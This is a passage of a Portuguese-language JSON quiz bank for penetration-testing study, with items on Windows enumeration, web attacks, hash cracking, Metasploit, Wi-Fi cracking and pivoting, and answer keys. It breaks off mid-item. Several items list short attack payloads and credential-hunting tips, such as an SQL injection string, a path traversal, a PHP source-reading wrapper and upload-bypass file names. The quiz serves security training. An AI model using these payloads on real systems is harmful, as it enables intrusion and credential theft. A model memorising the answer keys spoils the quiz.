    "q": "Qual comando mostra privilégios do usuário atual no Windows?",
    "options": [
      "whoami /priv",
      "priv list",
      "who /privileges",
      "privshow"
    ],
    "answer": 0,
    "exp": "'whoami /priv' lista os privilégios atribuídos ao token de segurança atual, revelando permissões críticas como SeImpersonatePrivilege."
  },
  {
    "id": "h-074",
    "cat": "Windows & Active Directory",
    "q": "O que faz net user no Windows?",
    "options": [
      "Lista usuários locais",
      "Cria antivírus",
      "Mostra a rede",
      "Desliga o PC"
    ],
    "answer": 0,
    "exp": "'net user' lista todos os usuários locais da máquina; 'net user <nome>' exibe detalhes como grupos e data de expiração de senha."
  },
  {
    "id": "h-075",
    "cat": "Windows & Active Directory",
    "q": "Qual comando lista serviços no Windows?",
    "options": [
      "sc query ou services.msc",
      "net show",
      "list svc",
      "tasklist"
    ],
    "answer": 0,
    "exp": "'sc query' na linha de comando e o snap-in 'services.msc' listam o estado e configuração de todos os serviços do Windows."
  },
  {
    "id": "h-076",
    "cat": "Windows & Active Directory",
    "q": "Qual ferramenta Windows lista tarefas agendadas pela linha de comando?",
    "options": [
      "schtasks",
      "crontab",
      "tasklist",
      "at show"
    ],
    "answer": 0,
    "exp": "'schtasks /query /fo LIST /v' detalha todas as tarefas agendadas no Windows, seus horários e binários executados."
  },
  {
    "id": "h-077",
    "cat": "Windows & Active Directory",
    "q": "O que o ipconfig /all faz no Windows?",
    "options": [
      "Mostra configuração completa de rede",
      "Formata o disco",
      "Lista usuários",
      "Instala drivers"
    ],
    "answer": 0,
    "exp": "'ipconfig /all' detalha endereços IP, máscara de sub-rede, gateway padrão, servidores DNS e endereço MAC de todas as interfaces de rede."
  },
  {
    "id": "h-078",
    "cat": "Escalação de Privilégio",
    "q": "Onde costumam ficar senhas expostas em instalações Windows mal configuradas?",
    "options": [
      "unattend.xml / sysprep.xml",
      "kernel32.dll",
      "bootmgr",
      "pagefile.sys"
    ],
    "answer": 0,
    "exp": "Arquivos de instalação automatizada como Unattend.xml e sysprep.xml em C:\\Windows\\Panther\\ frequentemente guardam senhas de Administrador em texto puro ou base64."
  },
  {
    "id": "h-079",
    "cat": "Web Hacking & Burp",
    "q": "O que é SQL Injection?",
    "options": [
      "Inserir código SQL malicioso em entradas da aplicação para manipular o banco de dados",
      "Injetar vírus no servidor SQL",
      "Instalar o SQL Server",
      "Criptografar o banco"
    ],
    "answer": 0,
    "exp": "SQL Injection ocorre quando dados não tratados do usuário são concatenados em queries SQL, permitindo alterar a lógica de execução e vazar ou modificar dados."
  },
  {
    "id": "h-080",
    "cat": "Web Hacking & Burp",
    "q": "Qual payload clássico testa SQL Injection num campo de login?",
    "options": [
      "' OR 1=1--",
      "<script>alert(1)</script>",
      "../../../etc/passwd",
      "; ping 127.0.0.1"
    ],
    "answer": 0,
    "exp": "' OR 1=1-- fecha a aspa do valor, introduz uma condição tautológica sempre verdadeira e comenta o restante da query original."
  },
  {
    "id": "h-081",
    "cat": "Web Hacking & Burp",
    "q": "O que é XSS (Cross-Site Scripting)?",
    "options": [
      "Injeção de JavaScript no navegador da vítima",
      "Injeção de SQL",
      "Roubo de senha por força bruta",
      "Ataque DDoS"
    ],
    "answer": 0,
    "exp": "XSS permite que atacantes injetem scripts client-side (normalmente JavaScript) em páginas web vistas por outros usuários, podendo roubar cookies de sessão."
  },
  {
    "id": "h-082",
    "cat": "Web Hacking & Burp",
    "q": "O que é LFI (Local File Inclusion)?",
    "options": [
      "Incluir arquivos locais do servidor via parâmetro da aplicação (ex.: ../../../../etc/passwd)",
      "Incluir bibliotecas JavaScript",
      "Upload de arquivos",
      "Injeção de headers"
    ],
    "answer": 0,
    "exp": "LFI permite que um atacante leia arquivos confidenciais do próprio servidor manipulando parâmetros de inclusão de arquivos (directory traversal)."
  },
  {
    "id": "h-083",
    "cat": "Web Hacking & Burp",
    "q": "O que é IDOR?",
    "options": [
      "Acessar recursos de outros usuários trocando identificadores (ex.: /api/user/1043 → 1042)",
      "Um tipo de firewall",
      "Ferramenta de scan",
      "Protocolo de rede"
    ],
    "answer": 0,
    "exp": "Insecure Direct Object References (IDOR) ocorre quando a aplicação expõe referências a objetos internos sem validar a autorização do usuário solicitante."
  },
  {
    "id": "h-084",
    "cat": "Web Hacking & Burp",
    "q": "O que é SSRF?",
    "options": [
      "Forçar o servidor a fazer requisições para destinos escolhidos pelo atacante (ex.: http://169.254.169.254)",
      "Um scanner de subdomínios",
      "Tipo de criptografia",
      "Formato de relatório"
    ],
    "answer": 0,
    "exp": "Server-Side Request Forgery induz o servidor vulnerável a realizar requisições HTTP para recursos internos restritos (como metadados cloud em 169.254.169.254)."
  },
  {
    "id": "h-085",
    "cat": "Web Hacking & Burp",
    "q": "No teste de File Upload, qual é uma técnica comum de bypass?",
    "options": [
      "Renomear shell.php para shell.phtml ou shell.php5",
      "Compactar o arquivo em ZIP",
      "Enviar por FTP",
      "Renomear para .txt e desistir"
    ],
    "answer": 0,
    "exp": "Bypass de extensões inclui testar alternativas interpretadas pelo servidor web (.phtml, .php5, .phar) ou extensões duplas quando a validação é frágil."
  },
  {
    "id": "h-086",
    "cat": "Web Hacking & Burp",
    "q": "Qual wrapper PHP permite ler o código-fonte de um arquivo em base64?",
    "options": [
      "php://filter/convert.base64-encode/resource=index.php",
      "file://base64",
      "php://read",
      "base64://index.php"
    ],
    "answer": 0,
    "exp": "O filtro 'php://filter/convert.base64-encode/resource=index.php' codifica o código-fonte antes que o interpretador execute o PHP, permitindo ler o arquivo original."
  },
  {
    "id": "h-087",
    "cat": "Web Hacking & Burp",
    "q": "O que o .env exposto num site geralmente contém?",
    "options": [
      "Credenciais de banco e chaves de API",
      "Imagens do site",
      "Logs de acesso",
      "Nada relevante"
    ],
    "answer": 0,
    "exp": "O arquivo .env armazena variáveis de ambiente críticas (DB_PASSWORD, AWS_SECRET_KEY, JWT_SECRET), cujo vazamento compromete toda a infraestrutura."
  },
  {
    "id": "h-088",
    "cat": "Web Hacking & Burp",
    "q": "Um diretório /.git exposto no site permite:",
    "options": [
      "Reconstruir o código-fonte do repositório (ex.: com git-dumper)",
      "Apenas ver o histórico de visitas",
      "Bloquear o site",
      "Nada, é decorativo"
    ],
    "answer": 0,
    "exp": "Ter a pasta /.git exposta permite reconstruir commits, branches e todo o histórico do código-fonte através de ferramentas como git-dumper."
  },
  {
    "id": "h-089",
    "cat": "Senhas & Força Bruta",
    "q": "O que é a wordlist rockyou.txt?",
    "options": [
      "Lista de milhões de senhas vazadas reais, muito usada em ataques de dicionário",
      "Lista de IPs",
      "Banco de exploits",
      "Antivírus"
    ],
    "answer": 0,
    "exp": "rockyou.txt contém mais de 14 milhões de senhas reais originadas de um vazamento em 2009, sendo a wordlist padrão no Kali Linux (/usr/share/wordlists/rockyou.txt)."
  },
  {
    "id": "h-090",
    "cat": "Senhas & Força Bruta",
    "q": "Qual ferramenta quebra hashes usando GPU?",
    "options": [
      "Hashcat",
      "Wireshark",
      "Nmap",
      "ZAP"
    ],
    "answer": 0,
    "exp": "Hashcat é o utilitário de quebra de senhas mais rápido do mundo, aproveitando a massiva paralelização de placas de vídeo (GPU) via OpenCL/CUDA."
  },
  {
    "id": "h-091",
    "cat": "Senhas & Força Bruta",
    "q": "O que é \"password spray\"?",
    "options": [
      "Testar 1 senha comum contra muitos usuários (devagar, evita bloqueio)",
      "Testar milhares de senhas num único usuário",
      "Limpar senhas do sistema",
      "Gerar senhas aleatórias"
    ],
    "answer": 0,
    "exp": "Password Spraying testa poucas senhas comuns (ex: 'Empresa@2026!') contra centenas de contas, contornando políticas de bloqueio de conta por tentativas consecutivas."
  },
  {
    "id": "h-092",
    "cat": "Senhas & Força Bruta",
    "q": "Qual formato de hash é típico de sistemas Linux ($6$...)?",
    "options": [
      "SHA-512 crypt",
      "Plain text",
      "Base64 puro",
      "ROT13"
    ],
    "answer": 0,
    "exp": "No Linux, o identificador '$6$' no início do hash no /etc/shadow indica o algoritmo SHA-512 crypt (com salt e múltiplas iterações)."
  },
  {
    "id": "h-093",
    "cat": "Senhas & Força Bruta",
    "q": "No Hashcat, o que significa o parâmetro -m 0?",
    "options": [
      "Tipo de hash MD5",
      "Modo silencioso",
      "Máquina alvo",
      "Multiplicador"
    ],
    "answer": 0,
    "exp": "O modo '-m 0' instrui o Hashcat a quebrar hashes do tipo MD5 puro."
  },
  {
    "id": "h-094",
    "cat": "Senhas & Força Bruta",
    "q": "Qual ataque tenta combinações de palavras com regras (maiúsculas, símbolos)?",
    "options": [
      "Ataque de dicionário com regras / mask attack",
      "Brute force puro de 95 caracteres",
      "Rainbow table estática",
      "Credential stuffing com listas alheias"
    ],
    "answer": 0,
    "exp": "Regras do Hashcat/John mutam palavras-base (adicionando anos no final, substituindo letras por números) para acertar senhas humanas estruturadas."
  },
  {
    "id": "h-095",
    "cat": "Senhas & Força Bruta",
    "q": "O que é \"credential stuffing\"?",
    "options": [
      "Reusar credenciais vazadas de outros serviços para tentar login",
      "Encher o banco de senhas",
      "Criar senhas fortes",
      "Um tipo de MFA"
    ],
    "answer": 0,
    "exp": "Credential Stuffing automatiza o teste de pares de e-mail e senha obtidos em vazamentos públicos de terceiros contra outros serviços web."
  },
  {
    "id": "h-096",
    "cat": "Criptografia & Defesa",
    "q": "MFA (autenticação multifator) ajuda porque:",
    "options": [
      "Senha roubada sozinha não é suficiente para o acesso",
      "Criptografa o tráfego",
      "Bloqueia portas",
      "Remove hashes do sistema"
    ],
    "answer": 0,
    "exp": "O MFA exige um segundo fator (token temporário OTP, aplicativo autenticador ou chave física FIDO), inviabilizando acessos somente com senha comprometida."
  },
  {
    "id": "h-097",
    "cat": "Labs & Treinamento",
    "q": "Qual site é a referência gratuita para aprender exploração web com laboratórios?",
    "options": [
      "PortSwigger Web Security Academy",
      "Shodan",
      "Exploit-DB",
      "GTFOBins"
    ],
    "answer": 0,
    "exp": "A PortSwigger Web Security Academy oferece dezenas de trilhas práticas interativas gratuitas cobrindo todas as categorias de vulnerabilidades web."
  },
  {
    "id": "h-098",
    "cat": "Labs & Treinamento",
    "q": "Numa máquina CTF (estilo TryHackMe/HTB), qual o costume de flags?",
    "options": [
      "Arquivos de texto que provam que você completou o objetivo (user.txt / root.txt)",
      "Senhas de administrador",
      "Certificados SSL",
      "Chaves de API públicas"
    ],
    "answer": 0,
    "exp": "As flags são hashes alfanuméricos em arquivos como /home/user/user.txt e /root/root.txt que comprovam a obtenção de shell de usuário e privilégio máximo."
  },
  {
    "id": "h-099",
    "cat": "Metodologia & Fundamentos",
    "q": "No relatório, o que é mais importante ao descrever um achado?",
    "options": [
      "Impacto de negócio + evidência + recomendação de correção",
      "Só o número do CVE",
      "Quantos exploits você testou",
      "O nome das suas ferramentas"
    ],
    "answer": 0,
    "exp": "Um achado de qualidade deve demonstrar o risco real ao negócio com passos reproduzíveis (PoC) e o plano claro de mitigação técnica."
  },
  {
    "id": "h-100",
    "cat": "Labs & Treinamento",
    "q": "Qual plataforma permite criar VMs vulneráveis gratuitas para praticar em casa?",
    "options": [
      "VulnHub",
      "Steam",
      "Shodan",
      "GitHub Pages"
    ],
    "answer": 0,
    "exp": "VulnHub hospeda centenas de máquinas virtuais vulneráveis criadas pela comunidade para download e prática offline no VirtualBox/VMware."
  },
  {
    "id": "h-101",
    "cat": "Web Hacking & Burp",
    "q": "Qual módulo do Burp Suite permite interceptar e modificar requisições antes de chegarem ao servidor?",
    "options": [
      "Proxy (com Intercept)",
      "Repeater",
      "Decoder",
      "Collaborator"
    ],
    "answer": 0,
    "exp": "O módulo Proxy com o 'Intercept is on' pausa cada requisição HTTP/HTTPS enviada pelo navegador, permitindo alteração manual em tempo real."
  },
  {
    "id": "h-102",
    "cat": "Web Hacking & Burp",
    "q": "Qual módulo do Burp Suite reenvia a mesma requisição quantas vezes você quiser, editando-a?",
    "options": [
      "Intruder",
      "Repeater",
      "Spider",
      "Target"
    ],
    "answer": 1,
    "exp": "O Burp Repeater (Ctrl+R) permite alterar parâmetros e reenviar requisições repetidamente, observando imediatamente a resposta do servidor."
  },
  {
    "id": "h-103",
    "cat": "Web Hacking & Burp",
    "q": "Qual módulo do Burp automatiza ataques de fuzzing (payloads em posições da requisição)?",
    "options": [
      "Intruder",
      "Decoder",
      "Extender",
      "Sequencer"
    ],
    "answer": 0,
    "exp": "O Burp Intruder injeta listas de payloads em posições demarcadas por §payload§ na requisição, automatizando testes de força bruta e fuzzing."
  },
  {
    "id": "h-104",
    "cat": "Web Hacking & Burp",
    "q": "Para que serve o módulo Decoder do Burp Suite?",
    "options": [
      "Codificar/decodificar dados (base64, URL, hex)",
      "Escanear vulnerabilidades",
      "Capturar pacotes UDP",
      "Gerar relatórios"
    ],
    "answer": 0,
    "exp": "O Decoder converte rapidamente strings entre texto puro, URL-encoding, Base64, HTML entities, Hexadecimal e hashes."
  },
  {
    "id": "h-105",
    "cat": "Web Hacking & Burp",
    "q": "O que faz o módulo Spider do Burp?",
    "options": [
      "Rastreia (crawl) automaticamente links e conteúdo do site",
      "Quebra senhas",
      "Testa Wi-Fi",
      "Compacta respostas"
    ],
    "answer": 0,
    "exp": "O Spider/Crawler navega recursivamente por formulários, hiperlinks e scripts para mapear a árvore completa de endpoints do site alvo."
  },
  {
    "id": "h-106",
    "cat": "Web Hacking & Burp",
    "q": "Como o Burp Suite consegue interceptar o tráfego do navegador?",
    "options": [
      "Configurando o navegador para usar o Burp como proxy (127.0.0.1:8080)",
      "Instalando um antivírus",
      "Via SSH",
      "Pelo firewall do Windows"
    ],
    "answer": 0,
    "exp": "O navegador é configurado para direcionar suas requisições ao proxy local do Burp rodando na porta 127.0.0.1:8080."
  },
  {
    "id": "h-107",
    "cat": "Web Hacking & Burp",
    "q": "Para interceptar HTTPS no Burp, é preciso:",
    "options": [
      "Instalar o certificado CA do Burp no navegador",
      "Desligar o computador",
      "Usar apenas HTTP",
      "Trocar de navegador"
    ],
    "answer": 0,
    "exp": "Como o HTTPS usa criptografia TLS ponta a ponta, é necessário importar a Autoridade Certificadora raiz (PortSwigger CA) no navegador para evitar alertas SSL."
  },
  {
    "id": "h-108",
    "cat": "Web Hacking & Burp",
    "q": "Qual módulo do Burp detecta tokens de sessão previsíveis ou fracos?",
    "options": [
      "Sequencer",
      "Repeater",
      "Target",
      "Proxy"
    ],
    "answer": 0,
    "exp": "O Sequencer coleta centenas de cookies/tokens e realiza testes estatísticos de aleatoriedade e entropia (FIPS) para detectar previsibilidade."
  },
  {
    "id": "h-109",
    "cat": "Metasploit Framework",
    "q": "No Metasploit, o que é um \"exploit\"?",
    "options": [
      "O código que explora a vulnerabilidade",
      "O que roda após obter acesso",
      "Um tipo de scanner",
      "A wordlist"
    ],
    "answer": 0,
    "exp": "Exploit é o módulo que tira proveito de uma falha específica no software para permitir a injeção ou entrega do payload no alvo."
  },
  {
    "id": "h-110",
    "cat": "Metasploit Framework",
    "q": "No Metasploit, o que é um \"payload\"?",
    "options": [
      "O código que executa depois da exploração bem-sucedida (ex.: shell, meterpreter)",
      "O scanner de portas",
      "O relatório",
      "O módulo auxiliar"
    ],
    "answer": 0,
    "exp": "Payload é o código de carga útil executado na máquina vítima após a exploração bem-sucedida (ex: abrir shell reverso, Meterpreter, adicionar usuário)."
  },
  {
    "id": "h-111",
    "cat": "Metasploit Framework",
    "q": "Qual comando do msfconsole define o alvo do exploit?",
    "options": [
      "set RHOSTS 192.168.1.10",
      "set TARGET_IP",
      "alvo 192.168.1.10",
      "run host"
    ],
    "answer": 0,
    "exp": "'set RHOSTS <IP>' define o Remote Host (endereço IP ou faixa do alvo) no Metasploit."
  },
  {
    "id": "h-112",
    "cat": "Metasploit Framework",
    "q": "Qual comando executa o módulo selecionado no Metasploit?",
    "options": [
      "exploit ou run",
      "go",
      "start",
      "fire"
    ],
    "answer": 0,
    "exp": "Tanto o comando 'exploit' quanto 'run' iniciam o ataque ou varredura do módulo carregado no msfconsole."
  },
  {
    "id": "h-113",
    "cat": "Metasploit Framework",
    "q": "O que faz o comando search no msfconsole?",
    "options": [
      "Busca módulos por nome, CVE ou plataforma",
      "Escaneia a rede",
      "Busca arquivos no alvo",
      "Encontra senhas"
    ],
    "answer": 0,
    "exp": "'search type:exploit name:smb cve:2017' pesquisa no catálogo do Metasploit por palavras-chave, tipo e número de CVE."
  },
  {
    "id": "h-114",
    "cat": "Metasploit Framework",
    "q": "Módulos \"auxiliary\" do Metasploit servem para:",
    "options": [
      "Scanners, fuzzers e enumeração (sem exploração direta)",
      "Criar payloads apenas",
      "Gerar relatórios",
      "Nada, são obsoletos"
    ],
    "answer": 0,
    "exp": "Módulos auxiliares englobam scanners de portas, auditores de senhas (login checkers), enumeração SNMP/SMB e utilitários de rede."
  },
  {
    "id": "h-115",
    "cat": "Metasploit Framework",
    "q": "No Meterpreter, qual comando mostra privilégios do usuário no Windows?",
    "options": [
      "getuid",
      "getsystem",
      "whoami -priv",
      "sysinfo"
    ],
    "answer": 0,
    "exp": "'getuid' retorna a identidade e contexto de segurança atual do processo do Meterpreter (ex: NT AUTHORITY\\SYSTEM)."
  },
  {
    "id": "h-116",
    "cat": "Metasploit Framework",
    "q": "No Meterpreter, qual comando tenta elevar privilégios para SYSTEM?",
    "options": [
      "getsystem",
      "root me",
      "sudo",
      "elevate now"
    ],
    "answer": 0,
    "exp": "'getsystem' tenta automaticamente várias técnicas de impersonação de token e named pipes para elevar o Meterpreter para SYSTEM."
  },
  {
    "id": "h-117",
    "cat": "Redes & Shells",
    "q": "Qual comando conecta via SSH a um servidor?",
    "options": [
      "ssh usuario@192.168.1.10",
      "connect ssh 192.168.1.10",
      "remote usuario@ip",
      "telnet -s 22"
    ],
    "answer": 0,
    "exp": "'ssh <user>@<IP>' inicia uma sessão criptografada segura no servidor remoto através da porta TCP 22."
  },
  {
    "id": "h-118",
    "cat": "Redes & Shells",
    "q": "Qual ferramenta permite transferência de arquivos por SSH?",
    "options": [
      "scp ou sftp",
      "ftp apenas",
      "wget",
      "netstat"
    ],
    "answer": 0,
    "exp": "'scp' (Secure Copy) e 'sftp' transferem arquivos criptografados usando a mesma autenticação e túnel do protocolo SSH."
  },
  {
    "id": "h-119",
    "cat": "Criptografia & Defesa",
    "q": "Chaves SSH são compostas por:",
    "options": [
      "Chave pública (no servidor) e chave privada (com você, protegida)",
      "Duas chaves públicas",
      "Uma senha em texto claro",
      "Um certificado SSL apenas"
    ],
    "answer": 0,
    "exp": "A chave pública fica em ~/.ssh/authorized_keys no alvo, enquanto a chave privada fica em posse exclusiva do cliente para assinar a autenticação."
  },
  {
    "id": "h-120",
    "cat": "Linux & Lab Setup",
    "q": "Onde ficam as chaves SSH do usuário no Linux?",
    "options": [
      "~/.ssh/",
      "/etc/sshkeys",
      "/home/.keys",
      "/var/ssh"
    ],
    "answer": 0,
    "exp": "O diretório ~/.ssh/ na home do usuário guarda as chaves privadas (id_rsa, id_ed25519), chaves públicas e o arquivo authorized_keys."
  },
  {
    "id": "h-121",
    "cat": "Escalação de Privilégio",
    "q": "Ao invadir um sistema Linux, onde procurar chaves SSH privadas de outros usuários?",
    "options": [
      "/home/*/.ssh/id_rsa",
      "/root/passwords",
      "/tmp",
      "/boot"
    ],
    "answer": 0,
    "exp": "Examinar chaves id_rsa em /home/*/.ssh/ permite reutilizá-las para obter acesso SSH direto como outros usuários ou escalar privilégios."
  },
  {
    "id": "h-122",
    "cat": "Linux & Lab Setup",
    "q": "Qual arquivo controla quem pode logar via SSH com chave pública?",
    "options": [
      "~/.ssh/authorized_keys",
      "/etc/passwd",
      "~/.ssh/known_hosts",
      "/etc/hosts"
    ],
    "answer": 0,
    "exp": "'authorized_keys' lista todas as chaves públicas autorizadas a autenticar sem senha naquele usuário específico."
  },
  {
    "id": "h-123",
    "cat": "Wireless & Engenharia Social",
    "q": "Qual suite de ferramentas é a principal para testes Wi-Fi?",
    "options": [
      "Aircrack-ng",
      "sqlmap",
      "Nessus",
      "Wireshark"
    ],
    "answer": 0,
    "exp": "Aircrack-ng é a suite clássica completa para auditoria de redes 802.11 (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)."
  },
  {
    "id": "h-124",
    "cat": "Wireless & Engenharia Social",
    "q": "O que é um handshake WPA?",
    "options": [
      "Troca de mensagens entre cliente e roteador usada para derivar/validar a senha",
      "Um tipo de antena",
      "Um protocolo de roteamento",
      "Uma senha padrão"
    ],
    "answer": 0,
    "exp": "O 4-Way Handshake do WPA/WPA2 ocorre quando um dispositivo se conecta ao AP; capturá-lo permite tentar quebrar a PSK offline."
  },
  {
    "id": "h-125",
    "cat": "Wireless & Engenharia Social",
    "q": "Qual comando coloca a interface Wi-Fi em modo monitor?",
    "options": [
      "airmon-ng start wlan0",
      "wifi monitor on",
      "iwconfig --hack",
      "nc -mon wlan0"
    ],
    "answer": 0,
    "exp": "'airmon-ng start wlan0' habilita o modo monitor (wlan0mon), permitindo que o adaptador de rede capture todos os pacotes no ar."
  },
  {
    "id": "h-126",
    "cat": "Wireless & Engenharia Social",
    "q": "Depois de capturar um handshake, o que se faz com ele?",
    "options": [
      "Quebra a senha offline com aircrack-ng ou hashcat (modo 22000)",
      "Envia ao roteador",
      "Converte em SQL",
      "Nada, é inútil"
    ],
    "answer": 0,
    "exp": "O arquivo .cap/.pcap é processado via força bruta/dicionário em GPU no Hashcat (-m 22000)."
  },
  {
    "id": "h-127",
    "cat": "Wireless & Engenharia Social",
    "q": "Criptografia Wi-Fi considerada QUEBRADA/insegura hoje:",
    "options": [
      "WEP (e WPA original com TKIP)",
      "WPA3",
      "WPA2-AES",
      "Nenhuma está quebrada"
    ],
    "answer": 0,
    "exp": "O protocolo WEP tem falhas matemáticas graves no RC4 e pode ser quebrado em segundos com injeção de pacotes e coleta de IVs."
  },
  {
    "id": "h-128",
    "cat": "Wireless & Engenharia Social",
    "q": "Qual ataque Wi-Fi engana clientes ao criar uma rede falsa com nome idêntico?",
    "options": [
      "Evil Twin",
      "SQL Injection",
      "ARP spoofing",
      "DNS tunneling"
    ],
    "answer": 0,
    "exp": "O ataque Evil Twin clona o SSID e MAC de uma rede legítima para atrair dispositivos e capturar credenciais através de portais cativos falsos."
  },
  {
    "id": "h-129",
    "cat": "OSINT & Recon",
    "q": "Qual site gratuito consulta certificados TLS emitidos para um domínio, revelando subdomínios?",
    "options": [
      "crt.sh",
      "GitHub",
      "VirusTotal",
      "HaveIBeenPwned"
    ],
    "answer": 0,
    "exp": "crt.sh pesquisa os logs públicos de Certificate Transparency (CT logs), descobrindo rapidamente centenas de subdomínios que geraram certificados SSL."
  },
  {
    "id": "h-130",
    "cat": "OSINT & Recon",
    "q": "Qual ferramenta OWASP faz enumeração de subdomínios?",
    "options": [
      "Amass",
      "John",
      "Mimikatz",
      "SET"
    ],
    "answer": 0,
    "exp": "OWASP Amass realiza mapeamento abrangente de superfície de ataque e enumeração de ativos via OSINT e fontes DNS ativas/passivas."
  },
  {
    "id": "h-131",
    "cat": "OSINT & Recon",
    "q": "Qual ferramenta faz visualização gráfica de relações em OSINT (pessoas, domínios, empresas)?",
    "options": [
      "Maltego",
      "gobuster",
      "Hashcat",
      "Burp"
    ],
    "answer": 0,
    "exp": "Maltego usa transformações automatizadas para gerar grafos visuais interativos interligando pessoas, emails, servidores, blocos de IP e empresas."
  },
  {
    "id": "h-132",
    "cat": "OSINT & Recon",
    "q": "O Recon-ng é:",
    "options": [
      "Um framework de recon com módulos, com interface parecida com Metasploit",
      "Um editor de texto",
      "Um antivírus",
      "Um firewall"
    ],
    "answer": 0,
    "exp": "Recon-ng é um framework modular em Python com banco de dados próprio para conduzir reconhecimento OSINT estruturado."
  },
  {
    "id": "h-133",
    "cat": "Wireless & Engenharia Social",
    "q": "Qual ferramenta da lista abaixo é usada para simulação de phishing/social engineering?",
    "options": [
      "Social Engineering Toolkit (SET)",
      "Nmap",
      "pspy",
      "scp"
    ],
    "answer": 0,
    "exp": "SET (da TrustedSec) automatiza ataques de engenharia social, clonagem de páginas de login para phishing e criação de vetores de payload."
  },
  {
    "id": "h-134",
    "cat": "OSINT & Recon",
    "q": "Para que serve a Wayback Machine em pentest?",
    "options": [
      "Ver versões antigas do site com páginas e endpoints removidos",
      "Comprar domínios",
      "Escanear malware",
      "Gerar wordlists"
    ],
    "answer": 0,
    "exp": "A Wayback Machine (web.archive.org) preserva cópias históricas de páginas web, revelando arquivos sensíveis, APIs antigas e rotas esquecidas."
  },
  {
    "id": "h-135",
    "cat": "OSINT & Recon",
    "q": "O que é fingerprinting de aplicação web?",
    "options": [
      "Identificar tecnologias usadas (servidor, framework, CMS, versões)",
      "Tirar foto da tela",
      "Hash de senhas",
      "Assinar certificados"
    ],
    "answer": 0,
    "exp": "Fingerprinting identifica o stack tecnológico (ex: Nginx 1.18, PHP 8.1, Laravel) analisando headers HTTP, cookies e estruturas de código."
  },
  {
    "id": "h-136",
    "cat": "OSINT & Recon",
    "q": "Qual comando mostra headers HTTP de um site?",
    "options": [
      "curl -I http://alvo.com",
      "head alvo.com",
      "wget --top",
      "netstat -h alvo.com"
    ],
    "answer": 0,
    "exp": "'curl -I <URL>' envia uma requisição HEAD que retorna apenas os cabeçalhos de resposta HTTP enviados pelo servidor."
  },
  {
    "id": "h-137",
    "cat": "Redes & Shells",
    "q": "O que é ARP Spoofing?",
    "options": [
      "Enviar respostas ARP falsas para interceptar tráfego na rede local (MITM)",
      "Escanear portas",
      "Quebrar Wi-Fi",
      "Injetar SQL"
    ],
    "answer": 0,
    "exp": "ARP Poisoning envenena a tabela ARP de outras máquinas na LAN associando o IP do gateway ao MAC do atacante para redirecionar o tráfego."
  },
  {
    "id": "h-138",
    "cat": "Redes & Shells",
    "q": "O que significa MITM?",
    "options": [
      "Man-in-the-Middle — atacante intercepta comunicação entre duas partes",
      "Máquina interna de teste",
      "Método de escaneamento",
      "Tipo de firewall"
    ],
    "answer": 0,
    "exp": "Man-in-the-Middle (Homem no Meio) é o cenário em que o atacante se posiciona no fluxo de dados entre vítima e servidor para ler e alterar o tráfego."
  },
  {
    "id": "h-139",
    "cat": "Windows & Active Directory",
    "q": "Qual ferramenta captura hashes NTLM na rede Windows envenenando respostas?",
    "options": [
      "Responder",
      "Hydra",
      "Wireshark",
      "Nikto"
    ],
    "answer": 0,
    "exp": "Responder envenena requisições multicast LLMNR, NBT-NS e MDNS na rede Windows, forçando alvos a enviarem seus hashes NTLMv2."
  },
  {
    "id": "h-140",
    "cat": "Redes & Shells",
    "q": "O que é DNS Spoofing?",
    "options": [
      "Responder consultas DNS com IPs falsos, redirecionando a vítima",
      "Escanear servidores DNS",
      "Registrar domínios",
      "Criptografar DNS"
    ],
    "answer": 0,
    "exp": "DNS Spoofing forja respostas DNS para enviar a vítima para um servidor sob controle do atacante em vez do destino real."
  },
  {
    "id": "h-141",
    "cat": "Redes & Shells",
    "q": "Qual ferramenta é o \"canivete suíço\" de conexões TCP/UDP simples em linha de comando?",
    "options": [
      "Netcat",
      "Firefox",
      "VirtualBox",
      "Obsidian"
    ],
    "answer": 0,
    "exp": "Netcat (nc) lê e escreve dados em conexões TCP/UDP, servindo para banner grabbing, transferência de arquivos, port scanning e shells."
  },
  {
    "id": "h-142",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "O que é pivoting em pentest?",
    "options": [
      "Usar uma máquina comprometida como ponto de partida para alcançar outras redes",
      "Trocar de ferramenta",
      "Girar o proxy do navegador",
      "Mudar de usuário no Linux"
    ],
    "answer": 0,
    "exp": "Pivoting usa um host já dominado na DMZ ou rede inicial como túnel/ponte para atacar redes internas e segmentos isolados."
  },
  {
    "id": "h-143",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Para que serve o proxychains?",
    "options": [
      "Forçar ferramentas a passarem por um proxy/SOCKS (útil em pivoting)",
      "Criar proxies de internet",
      "Bloquear tráfego",
      "Acelerar o Nmap"
    ],
    "answer": 0,
    "exp": "Proxychains intercepta chamadas de socket dinamicamente, forçando programas (Nmap, SSH, Curl) a rotearem seus pacotes através de proxies SOCKS/HTTP."
  },
  {
    "id": "h-144",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Qual ferramenta moderna simplifica tunneling/pivoting sem proxychains?",
    "options": [
      "ligolo-ng",
      "sqlmap",
      "Nikto",
      "theHarvester"
    ],
    "answer": 0,
    "exp": "ligolo-ng cria uma interface de rede TUN virtual no atacante, permitindo usar qualquer ferramenta nativamente sem encapsuladores."
  },
  {
    "id": "h-145",
    "cat": "Metodologia & Fundamentos",
    "q": "O CVSS serve para:",
    "options": [
      "Atribuir pontuação de severidade a vulnerabilidades",
      "Cadastrar exploits",
      "Criar VMs",
      "Gerar wordlists"
    ],
    "answer": 0,
    "exp": "Common Vulnerability Scoring System (CVSS) padroniza a severidade de falhas em uma escala de 0.0 a 10.0 baseada em métricas de ataque e impacto."
  },
  {
    "id": "h-146",
    "cat": "Metodologia & Fundamentos",
    "q": "O que é um CVE?",
    "options": [
      "Identificador público único de uma vulnerabilidade (ex.: CVE-2021-44228)",
      "Um antivírus",
      "Um framework de exploração",
      "Um tipo de hash"
    ],
    "answer": 0,
    "exp": "Common Vulnerabilities and Exposures (CVE) é o catálogo de referência mundial que atribui IDs padronizados a vulnerabilidades conhecidas."
  },
  {
    "id": "h-147",
    "cat": "Web Hacking & Burp",
    "q": "Log4Shell (CVE-2021-44228) é uma vulnerabilidade de que tipo?",
    "options": [
      "RCE via Log4j (Java) por JNDI injection",
      "Senha fraca",
      "Porta aberta",
      "Phishing"
    ],
    "answer": 0,
    "exp": "Log4Shell permitia Execução Remota de Código (RCE) em milhões de sistemas Java através do processamento inseguro de strings JNDI no Apache Log4j."
  },
  {
    "id": "h-148",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual certificação é considerada a mais respeitada em pentest prático?",
    "options": [
      "OSCP",
